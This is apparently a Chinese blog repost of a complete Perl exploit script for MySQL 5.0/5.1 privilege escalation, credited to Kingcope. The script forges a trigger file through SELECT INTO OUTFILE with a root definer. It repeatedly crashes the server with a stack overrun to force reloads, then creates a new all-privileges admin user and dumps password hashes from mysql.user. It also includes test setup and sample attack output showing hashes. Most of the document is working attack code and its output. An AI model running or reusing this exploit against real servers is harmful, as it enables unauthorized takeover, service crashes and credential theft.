## 普通用户提权

小编的话：Kingcope神牛又放干货了。

漏洞在12月1日的Seclist上发布，作者在Debian Lenny (mysql-5.0.51a) 、 OpenSuSE 11.4 (5.1.53-log)上测试成功，代码执行成功后会增加一个MySQL的管理员帐号。

use DBI();

$|=1;

=for comment

MySQL privilege elevation Exploit

This exploit adds a new admin user.

By Kingcope

Tested on

* Debian Lenny (mysql-5.0.51a)

* OpenSuSE 11.4 (5.1.53-log)

How it works:

This exploit makes use of several things:

*The attacker is in possession of a mysql user with &amp;apos;file&amp;apos; privileges for the target

*So the attacker can create files on the system with this user (owned by user &amp;apos;mysql&amp;apos;)

*So the attacker is able to create TRIGGER files for a mysql table

       triggers can be used to trigger an event when a mysql command is executed by the user,

       normally triggers are &amp;apos;attached&amp;apos; to a user and will be executed with this users privilege.

       because we can write any contents into the TRG file (the actual trigger file), we write the entry

       describing the attached user for the trigger as &quot;root@localhost&quot; what is the default admin user.

* We make use of the stack overrun priorly discovered to flush the server config so the trigger file is recognized.

 This step is really important, without crashing the mysql server instance and reconnecting (the server will respawn)

 the trigger file would not be recognized.

So what the exploit does is:

* Connect to the MySQL Server

* Create a table named rootme for the trigger

* Create the trigger file in /var/lib/mysql/&lt;databasename&gt;/rootme.TRG

* Crash the MySQL Server to force it to respawn and recognize the trigger file (by triggering the stack overrun)

* INSERT a value into the table so the trigger event gets executed

* The trigger now sets all privileges of the current connecting user in the mysql.user table to enabled.

* Crash the MySQL Server again to force it reload the user configuration

* Create a new mysql user with all privileges set to enabled

* Crash again to reload configuration

* Connect by using the newly created user

* The new connection has ADMIN access now to all databases in mysql

* The user and password hashes in the mysql.user table are dumped for a convinient way to show the exploit succeeded

* As said the user has FULL ACCESS to the database now

Respawning of mysqld is done by mysqld_safe so this is not an issue in any configuration I&amp;apos;ve seen.

=cut

=for comment

user created for testing (file privs will minor privileges to only one database):

mysql&gt; CREATE USER &amp;apos;less&amp;apos;@&amp;apos;%&amp;apos; IDENTIFIED BY &amp;apos;test&amp;apos;;

Query OK, 0 rows affected (0.00 sec)

mysql&gt; create database lessdb

   -&gt; ;

Query OK, 1 row affected (0.00 sec)

mysql&gt; GRANT ALL PRIVILEGES ON lessdb.* TO &amp;apos;less&amp;apos;@&amp;apos;%&amp;apos; WITH GRANT OPTION;

Query OK, 0 rows affected (0.02 sec)

mysql&gt; GRANT FILE ON *.* TO &amp;apos;less&amp;apos;@&amp;apos;%&amp;apos; WITH GRANT OPTION;

Query OK, 0 rows affected (0.00 sec)

login with new unprivileged user:

mysql&gt; select * from mysql.user;

ERROR 1142 (42000): SELECT command denied to user &amp;apos;less2&amp;apos;@&amp;apos;localhost&amp;apos; for table &amp;apos;user&amp;apos;

=cut

=for comment

example attack output:

C:\Users\kingcope\Desktop&gt;perl mysql_privilege_elevation.pl

select &amp;apos;TYPE=TRIGGERS&amp;apos; into outfile&amp;apos;/var/lib/mysql/lessdb3/rootme.TRG&amp;apos; LINES TER

MINATED BY &amp;apos;\ntriggers=\&amp;apos;CREATE DEFINER=`root`@`localhost` trigger atk after ins

ert on rootme for each row\\nbegin \\nUPDATE mysql.user SET Select_priv=\\\&amp;apos;Y\\\

&amp;apos;, Insert_priv=\\\&amp;apos;Y\\\&amp;apos;, Update_priv=\\\&amp;apos;Y\\\&amp;apos;, Delete_priv=\\\&amp;apos;Y\\\&amp;apos;, Create_p

riv=\\\&amp;apos;Y\\\&amp;apos;, Drop_priv=\\\&amp;apos;Y\\\&amp;apos;, Reload_priv=\\\&amp;apos;Y\\\&amp;apos;, Shutdown_priv=\\\&amp;apos;Y\\

\&amp;apos;, Process_priv=\\\&amp;apos;Y\\\&amp;apos;, File_priv=\\\&amp;apos;Y\\\&amp;apos;, Grant_priv=\\\&amp;apos;Y\\\&amp;apos;, Reference

s_priv=\\\&amp;apos;Y\\\&amp;apos;, Index_priv=\\\&amp;apos;Y\\\&amp;apos;, Alter_priv=\\\&amp;apos;Y\\\&amp;apos;, Show_db_priv=\\\&amp;apos;Y

\\\ &amp;apos;, Super_priv=\\\&amp;apos;Y\\\&amp;apos;, Create_tmp_table_priv=\\\&amp;apos;Y\\\&amp;apos;, Lock_tables_priv=\\

\&amp;apos;Y\\\&amp;apos;, Execute_priv=\\\&amp;apos;Y\\\&amp;apos;, Repl_slave_priv=\\\&amp;apos;Y\\\&amp;apos;, Repl_client_priv=\\\

&amp;apos;Y\\\&amp;apos;, Create_view_priv=\\\&amp;apos;Y\\\&amp;apos;, Show_view_priv=\\\&amp;apos;Y\\\&amp;apos;, Create_routine_pri

v=\\\&amp;apos;Y\\\&amp;apos;, Alter_routine_priv=\\\&amp;apos;Y\\\&amp;apos;, Create_user_priv=\\\&amp;apos;Y\\\&amp;apos;, ssl_type=

\\\&amp;apos;Y\\\ &amp;apos;, ssl_cipher=\\\&amp;apos;Y\\\&amp;apos;, x509_issuer=\\\&amp;apos;Y\\\&amp;apos;, x509_subject=\\\&amp;apos;Y\\\&amp;apos;,

max_questions=\\\&amp;apos;Y\\\&amp;apos;, max_updates=\\\&amp;apos;Y\\\&amp;apos;, max_connections=\\\&amp;apos;Y\\\&amp;apos; WHERE

User=\\\&amp;apos;less3\\\&amp;apos;;\\nend\&amp;apos;\nsql_modes=0\ndefiners=\&amp;apos;root@localhost\&amp;apos;\nclient_cs

_names=\&amp;apos;latin1\&amp;apos;\nconnection_cl_names=\&amp;apos;latin1_swedish_ci\&amp;apos;\ndb_cl_names=\&amp;apos;lati

n1_swedish_ci\&amp;apos;\n&amp;apos;;DBD::mysql::db do failed: Unknown table &amp;apos;rootme&amp;apos; at mysql_pri

vilege_elevation.pl line 44.

DBD::mysql::db do failed: Lost connection to MySQL server during query at mysql_

privilege_elevation.pl line 50.

DBD::mysql::db do failed: Lost connection to MySQL server during query at mysql_

privilege_elevation.pl line 59.

W00TW00T!

Found a row: id = root, name = *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B

Found a row: id = root, name = *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B

Found a row: id = root, name = *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B

Found a row: id = debian-sys-maint, name = *C5524C128621D8A050B6DD616B06862F9D64

B02C

Found a row: id = some1, name = *94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29

Found a row: id = monty, name = *BF06A06D69EC935E85659FCDED1F6A80426ABD3B

Found a row: id = less, name = *94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29

Found a row: id = r00ted, name = *EAD0219784E951FEE4B82C2670C9A06D35FD5697

Found a row: id = user, name = *14E65567ABDB5135D0CFD9A70B3032C179A49EE7

Found a row: id = less2, name = *94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29

Found a row: id = less3, name = *94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29

Found a row: id = rootedsql, name = *4149A2E66A41BD7C8F99D7F5DF6F3522B9D7D9BC

=cut

$user = &quot;less10&quot;;

$password = &quot;test&quot;;

$database = &quot;lessdb10&quot;;

$target = &quot;192.168.2.4&quot;;

$folder = &quot;/var/lib/mysql/&quot;; # Linux

$newuser = &quot;rootedbox2&quot;;

$newuserpass = &quot;rootedbox2&quot;;

$mysql_version = &quot;51&quot;; # can be 51 or 50

if ($mysql_version eq &quot;50&quot;) {

$inject =

&quot;select &amp;apos;TYPE=TRIGGERS&amp;apos; into outfile&amp;apos;&quot;.$folder.$database.&quot;/rootme.TRG&amp;apos; LINES TERMINATED BY &amp;apos; \\ntriggers=\\&amp;apos;CREATE DEFINER=`root`\@`localhost` trigger atk after insert on rootme for each row\\\\nbegin \\\\nUPDATE mysql.user SET Select_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Insert_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Update_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Delete_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Create_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Drop_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Reload_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Shutdown_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Process_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, File_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Grant_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, References_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Index_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Alter_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Show_db_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Super_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Create_tmp_table_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Lock_tables_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Execute_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Repl_slave_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Repl_client_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Create_view_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Show_view_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Create_routine_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Alter_routine_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Create_user_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, ssl_type=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, ssl_cipher=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, x509_issuer=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, x509_subject=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, max_questions=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, max_updates=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, max_connections=\\\\\\&amp;apos;Y\\\\\\&amp;apos; WHERE User=\\\\\\&amp;apos;$user\\\\\\&amp;apos;;\\\\nend\\&amp;apos;\\nsql_modes=0\\ndefiners=\\&amp;apos;root\@localhost\\&amp;apos;\\nclient_cs_names=\\&amp;apos;latin1\\&amp;apos;\\nconnection_cl_names=\\&amp;apos;latin1_swedish_ci\\&amp;apos;\\ndb_cl_names=\\&amp;apos;latin1_swedish_ci\\&amp;apos;\\n&amp;apos;;&quot;;

} else {

$inject =

&quot;select &amp;apos;TYPE=TRIGGERS&amp;apos; into outfile&amp;apos;&quot;.$folder.$database.&quot;/rootme.TRG&amp;apos; LINES TERMINATED BY &amp;apos; \\ntriggers=\\&amp;apos;CREATE DEFINER=`root`\@`localhost` trigger atk after insert on rootme for each row\\\\nbegin \\\\nUPDATE mysql.user SET Select_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Insert_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Update_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Delete_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Create_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Drop_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Reload_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Shutdown_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Process_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, File_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Grant_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, References_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Index_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Alter_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Show_db_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Super_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Create_tmp_table_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Lock_tables_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Execute_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Repl_slave_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Repl_client_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Create_view_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Show_view_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Create_routine_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Alter_routine_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Create_user_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Event_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, Trigger_priv=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, ssl_type=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, ssl_cipher=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, x509_issuer=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, x509_subject=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, max_questions=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, max_updates=\\\\\\&amp;apos;Y\\\\\\&amp;apos;, max_connections=\\\\\\&amp;apos;Y\\\\\\&amp;apos; WHERE User=\\\\\\&amp;apos;$user\\\\\\&amp;apos;;\\\\nend\\&amp;apos;\\nsql_modes=0\\ndefiners=\\&amp;apos;root\@localhost\\&amp;apos;\\nclient_cs_names=\\&amp;apos;latin1\\&amp;apos;\\nconnection_cl_names=\\&amp;apos;latin1_swedish_ci\\&amp;apos;\\ndb_cl_names=\\&amp;apos;latin1_swedish_ci\\&amp;apos;\\n&amp;apos;;&quot;;

}

print $inject;#exit;

$inject2 =

&quot;SELECT &amp;apos;TYPE=TRIGGERNAME\\ntrigger_table=rootme;&amp;apos; into outfile &amp;apos;&quot;.$folder.$database.&quot;/atk.TRN&amp;apos; FIELDS ESCAPED BY &amp;apos;&amp;apos;&quot;;

my $dbh = DBI-&gt;connect(&quot;DBI:mysql:database=$database;host=$target;&quot;,

                      &quot;$user&quot;, &quot;$password&quot;,

                      {&amp;apos;RaiseError&amp;apos; =&gt; 0});

eval { $dbh-&gt;do(&quot;DROP TABLE rootme&quot;) };

$dbh-&gt;do(&quot;CREATE TABLE rootme (rootme VARCHAR(256));&quot;);

$dbh-&gt;do($inject);

$dbh-&gt;do($inject2);

$a = &quot;A&quot; x 10000;

$dbh-&gt;do(&quot;grant all on $a.* to &amp;apos;user&amp;apos;\@&amp;apos;%&amp;apos; identified by &amp;apos;secret&amp;apos;;&quot;);

sleep(3);

my $dbh = DBI-&gt;connect(&quot;DBI:mysql:database=$database;host=$target;&quot;,

                      &quot;$user&quot;, &quot;$password&quot;,

                      {&amp;apos;RaiseError&amp;apos; =&gt; 0});

$dbh-&gt;do(&quot;INSERT INTO rootme VALUES(&amp;apos;ROOTED&amp;apos;);&quot;);

$dbh-&gt;do(&quot;grant all on $a.* to &amp;apos;user&amp;apos;\@&amp;apos;%&amp;apos; identified by &amp;apos;secret&amp;apos;;&quot;);

sleep(3);

my $dbh = DBI-&gt;connect(&quot;DBI:mysql:database=$database;host=$target;&quot;,

                      &quot;$user&quot;, &quot;$password&quot;,

                      {&amp;apos;RaiseError&amp;apos; =&gt; 0});

$dbh-&gt;do(&quot;CREATE USER &amp;apos;$newuser&amp;apos;\@&amp;apos;%&amp;apos; IDENTIFIED BY &amp;apos;$newuserpass&amp;apos;;&quot;);

$dbh-&gt;do(&quot;GRANT ALL PRIVILEGES ON *.* TO &amp;apos;$newuser&amp;apos;\@&amp;apos;%&amp;apos; WITH GRANT OPTION;&quot;);

$dbh-&gt;do(&quot;grant all on $a.* to &amp;apos;user&amp;apos;\@&amp;apos;%&amp;apos; identified by &amp;apos;secret&amp;apos;;&quot;);

sleep(3);

my $dbh = DBI-&gt;connect(&quot;DBI:mysql:host=$target;&quot;,

                      $newuser, $newuserpass,

                      {&amp;apos;RaiseError&amp;apos; =&gt; 0});

my $sth = $dbh-&gt;prepare(&quot;SELECT * FROM mysql.user&quot;);

$sth-&gt;execute();

print &quot;W00TW00T!\n&quot;;

while (my $ref = $sth-&gt;fetchrow_hashref()) {

print &quot;Found a row: id = $ref-&gt;{&amp;apos;User&amp;apos;}, name = $ref-&gt;{&amp;apos;Password&amp;apos;}\n&quot;;

}

$sth-&gt;finish();